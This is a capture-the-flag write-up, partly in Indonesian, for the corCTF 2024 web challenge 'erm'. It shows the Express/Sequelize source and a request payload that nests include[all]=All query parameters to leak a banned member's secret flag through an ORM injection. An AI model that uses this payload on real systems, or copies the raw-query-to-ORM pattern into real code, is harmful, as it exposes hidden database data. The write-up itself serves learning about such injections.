# COR-CTF2024 - erm - web - Writeup
Pada challene kali ini kita diberikan website static yang memunculkan writeups dan memeber tidak ada inputan apa apa pada challenge kali ini, namun setelah melakukan intercept pada burpsuite, ditemukan adanya endpoint dengan parameter yang menarik yaitu `/api/writeups?where[category]=web`, jelas endpoint ini rentan karena query di berikan sebagai inputan.

## Source Code
### App.js
```javascript!
const express = require("express");
const hbs = require("hbs");

const app = express();

const db = require("./db.js");

const PORT = process.env.PORT || 5000;

app.set("view engine", "hbs");

// catches async errors and forwards them to error handler
// https://stackoverflow.com/a/51391081
const wrap = fn => (req, res, next) => {
    return Promise
        .resolve(fn(req, res, next))
        .catch(next);
};

app.get("/api/members", wrap(async (req, res) => {
    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m => m.toJSON()) });
}));

app.get("/api/writeup/:slug", wrap(async (req, res) => {
    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
    if (!writeup) return res.status(404).json({ error: "writeup not found" });
    res.json({ writeup: writeup.toJSON() });
}));

app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a,b) => b.date - a.date) });
}));

app.get("/writeup/:slug", wrap(async (req, res) => {
    res.render("writeup");
}));

app.get("/writeups", wrap(async (req, res) => res.render("writeups")));

app.get("/members", wrap(async (req, res) => res.render("members")));

app.get("/", (req, res) => res.render("index"));

app.use((err, req, res, next) => {
    console.log(err);
    res.status(500).send('An error occurred');
});

app.listen(PORT, () => console.log(`web/erm listening on port ${PORT}`));
```

### db.js
```javascript!
const { Sequelize, DataTypes, Op } = require('sequelize');
const slugify = require('slugify');
const { rword } = require('rword');

const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: 'erm.db',
    logging: false
});  

const Category = sequelize.define('Category', {
    name: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    }
});

const Member = sequelize.define('Member', {
    username: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    },
    secret: {
        type: DataTypes.STRING,
    },
    kicked: {
        type: DataTypes.BOOLEAN,
        defaultValue: false,
    }
});

const Writeup = sequelize.define('Writeup', {
    title: {
        type: DataTypes.STRING,
        allowNull: false
    },
    slug: {
        type: DataTypes.STRING,
        allowNull: false,
    },
    content: {
        type: DataTypes.TEXT,
        allowNull: false
    },
    date: {
        type: DataTypes.DATE,
        allowNull: false
    },
    category: {
        type: DataTypes.STRING,
    }
});

Category.belongsToMany(Member, { through: 'MemberCategory' });
Member.belongsToMany(Category, { through: 'MemberCategory' });
Member.hasMany(Writeup);
Writeup.belongsTo(Member);

sequelize.sync().then(async () => {
    const writeupCount = await Writeup.count();
    if (writeupCount !== 0) return;
    console.log("seeding db with default data...");

    const categories = ["web", "pwn", "rev", "misc", "crypto", "forensics"];
    const members = [
        { username: "FizzBuzz101", categories: ["pwn", "rev"] },
        { username: "strellic", categories: ["web", "misc"] },
        { username: "EhhThing", categories: ["web", "misc"] },
        { username: "drakon", categories: ["web", "misc"], },
        { username: "ginkoid", categories: ["web", "misc"], },
        { username: "jazzpizazz", categories: ["web", "misc"], },
        { username: "BrownieInMotion", categories: ["web", "rev"] },
        { username: "clubby", categories: ["pwn", "rev"] },
        { username: "pepsipu", categories: ["pwn", "crypto"] },
        { username: "chop0", categories: ["pwn"] },
        { username: "ryaagard", categories: ["pwn"] },
        { username: "day", categories: ["pwn", "crypto"] },
        { username: "willwam845", categories: ["crypto"] },
        { username: "quintec", categories: ["crypto", "misc"] },
        { username: "anematode", categories: ["rev"] },
        { username: "0x5a", categories: ["pwn"] },
        { username: "emh", categories: ["crypto"] },
        { username: "jammy", categories: ["misc", "forensics"] },
        { username: "pot", categories: ["crypto"] },
        { username: "plastic", categories: ["misc", "forensics"] },
    ];

    for (const category of categories) {
        await Category.create({ name: category });
    }

    for (const member of members) {
        const m = await Member.create({ username: member.username });
        for (const category of member.categories) {
            const c = await Category.findOne({ where: { name: category } });
            await m.addCategory(c);
            await c.addMember(m);
        }
    }

    // the forbidden member
    // banned for leaking our solve scripts
    const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
    const web = await Category.findOne({ where: { name: "web" } });
    await goroo.addCategory(web);
    await web.addMember(goroo);

    for (let i = 0; i < 25; i++) {
        const challCategory = categories[Math.floor(Math.random() * categories.length)];
        const date = new Date(Math.floor(Math.random() * 4) + 2020, Math.floor(Math.random() * 12), Math.floor(Math.random() * 31) + 1);

        // most CTFs feel like they're just named with random words anyway
        const ctfName = `${rword.generate(1, { capitalize: 'first', length: '4-6' })}CTF ${date.getFullYear()}`;
        // same thing with challenge names
        const challName = `${challCategory}/${rword.generate(1)}`;

        const title = `${ctfName} - ${challName} Writeup`;
        const content = rword.generate(1, { capitalize: 'first'}) + " " + rword.generate(500).join(" ") + ".<br /><br />Thanks for reading!<br /><br />";
        
        const writeup = await Writeup.create({ title, content, date, slug: slugify(title, { lower: true }), category: challCategory });
        const authors = members.filter(m => m.categories.includes(challCategory));
        const author = await Member.findByPk(authors[Math.floor(Math.random() * authors.length)].username);

        await writeup.setMember(author);
        await author.addWriteup(writeup);
    }
});

module.exports = { Category, Member, Writeup };
```

After reading the source code, we have the following findings:

- This web application is written in Node.js with Express.js web application framework
- It uses SQLite store all the members, writeups, and categories
- It uses Sequelize ORM version 6 to interact with the SQLite database

Let’s deep dive into the main logic of this web application!

First, what’s our objective? Where’s the flag?

In erm/db.js, we can see that the flag is stored in member goroo’s secret:

```javascript!
const { Sequelize, DataTypes, Op } = require('sequelize');
[...]
const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: 'erm.db',
    logging: false
});
[...]
sequelize.sync().then(async () => {
    [...]
    // the forbidden member
    // banned for leaking our solve scripts
    const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
    const web = await Category.findOne({ where: { name: "web" } });
    await goroo.addCategory(web);
    await web.addMember(goroo);
    [...]
});

```

So, our goal is to somehow leak member goroo’s secret.

Also, this db.js defined the database’s structure.

Table Category:
```javascript!
const Category = sequelize.define('Category', {
    name: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    }
});

```

Table Member:
```javascript!

const Member = sequelize.define('Member', {
    username: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    },
    secret: {
        type: DataTypes.STRING,
    },
    kicked: {
        type: DataTypes.BOOLEAN,
        defaultValue: false,
    }
});
```
Table Writeup:
```javascript!

const Writeup = sequelize.define('Writeup', {
    title: {
        type: DataTypes.STRING,
        allowNull: false
    },
    slug: {
        type: DataTypes.STRING,
        allowNull: false,
    },
    content: {
        type: DataTypes.TEXT,
        allowNull: false
    },
    date: {
        type: DataTypes.DATE,
        allowNull: false
    },
    category: {
        type: DataTypes.STRING,
    }
});
```
Moreover, in Sequelize, it supports standard associations, such as One-To-One, One-To-Many and Many-To-Many. In our case, the database has the following relationships:

Category.belongsToMany(Member, { through: 'MemberCategory' });
- Specifies a Many-To-Many relationship between table Category and Member through a join table called MemberCategory
```javascript!
Member.belongsToMany(Category, { through: 'MemberCategory' });
```
Specifies a Many-To-Many relationship between table Member and Category through the same MemberCategory join table
```javascript!
Member.hasMany(Writeup);
```
Specifies a One-To-Many relationship between table Member and Writeup, which means a member can have multiple writeups
```javascript!
Writeup.belongsTo(Member);
```
Specifies a Many-To-One relationship between table Writeup and Member, which means a writeup belongs to a single member

After knowing the SQLite database structure, we can move on to erm/app.js.

In GET route /api/members, it returns all the existing members. Well, except the kicked one, which is goroo:
```javascript!
const express = require("express");
const hbs = require("hbs");

const app = express();

const db = require("./db.js");
[...]
// catches async errors and forwards them to error handler
// https://stackoverflow.com/a/51391081
const wrap = fn => (req, res, next) => {
    return Promise
        .resolve(fn(req, res, next))
        .catch(next);
};
[...]
app.get("/api/members", wrap(async (req, res) => {
    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m => m.toJSON()) });
}));
```
In addition, GET route /api/writeups is obviously to be vulnerable to SQL injection:
```javascript!
app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a,b) => b.date - a.date) });
}));
```
As you can see, it parses our request’s query directly into the findOne method.

Before we started to read the source code, we came across with this API call:
```javascript!
GET /api/writeups?where[category]=web HTTP/2
```

Which translate to:
```javascript!
db.Writeup.findAll({ 
    where: { category: "web" }
}
```
Hmm… Can we somehow leak member goroo’s secret via this route?

If we dig deeper into the Sequelize version 6 documentation, we’ll see that there’s a feature called “Eager Loading”.

> […]eager Loading is the act of querying data of several models at once (one ‘main’ model and one or more associated models). At the SQL level, this is a query with one or more joins. […] In Sequelize, eager loading is mainly done by using the include option on a model finder query (such as findOne, findAll, etc).

Huh, looks like we can use option include to fetch a table (Model) associated with a table?

In this documentation, it also mentioned that we can include all associated tables via all option:
```javascript!
// Fetch all models associated with User
User.findAll({ include: { all: All } });
```
By looking at the table Writeup’s relationships, we can leak member goroo’s secret by including all the relationships.

To do so, we could send the following GET request to /api/writeups:
```javascript!
GET /api/writeups?include[all]=All HTTP/2
Host: erm.be.ax
```
```javascript!
{"writeups":[{
    "id":14,
    "title":"LuxateCTF 2023 - pwn/scrummiest Writeup",
    "slug":"luxatectf-2023-pwnscrummiest-writeup",
    "content":"Stating guildsman as[...]",
    "date":"2023-10-08T00:00:00.000Z",
    "category":"pwn",
    "createdAt":"2024-11-06T07:27:13.412Z",
    "updatedAt":"2024-11-06T07:27:13.431Z",
    "MemberUsername":"ryaagard",
    "Member"
        {
            "username":"ryaagard",
            "secret":null,
            "kicked":false,
            "createdAt":"2024-11-06T07:27:12.569Z",
            "updatedAt":"2024-11-06T07:27:12.569Z"
    }},
```

Nice! We now nest included table Category!

if we do the same thing again, we’ll leak member goroo’s secret!

```javascript!
GET /api/writeups?include[all]=All&include[include][all]=All&include[include][include][all]=All HTTP/1.1
Host: localhost
```
```javascript!
{
    "id":10,
        "title":"BatmanCTF 2020 - [...]><br />",
            "date":"2020-06-22T00:00:00.000Z",
                [...],
                 [
                     {
                         "username":"strellic",
                         "secret":null,
                         [...],
                         
                    "updatedAt":"2024-11-06T07:27:12.459Z",
                         "CategoryName":"web",
                         "MemberUsername":"BrownieInMotion"
                     }
                     },
                     {
                         "username":"goroo",
                         "secret":"corctf{erm?_more_like_orm_amiright?}",
                         "kicked":true,
                         "createdAt":"2024-11-06T07:27:12.817Z",
                         "updatedAt":"2024-11-06T07:27:12.817Z",
                         "MemberCategory":{
                         "createdAt":"2024-11-06T07:27:12.828Z",
                         "updatedAt":"2024-11-06T07:27:12.828Z",
                         "CategoryName":"web",
                         "MemberUsername":"goroo"}
                 }
```